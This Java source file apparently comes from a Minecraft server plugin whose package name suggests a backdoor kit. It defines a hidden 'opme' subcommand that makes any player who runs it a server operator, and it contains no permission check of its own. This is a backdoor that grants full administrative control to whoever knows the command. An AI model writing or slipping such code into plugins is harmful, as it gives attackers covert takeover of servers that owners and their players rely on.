package me.ego.ezbd.commands;

import me.ego.ezbd.lib.fo.command.SimpleCommandGroup;
import me.ego.ezbd.lib.fo.command.SimpleSubCommand;

public class OpCommand extends SimpleSubCommand {
    protected OpCommand(SimpleCommandGroup parent) {
        super(parent, "opme");
        this.setMinArguments(0);
        this.setUsage("&fOps the player.");
    }

    protected void onCommand() {
        this.checkConsole();
        this.sender.setOp(true);
        this.tell(new String[]{"You are now op."});
    }
}
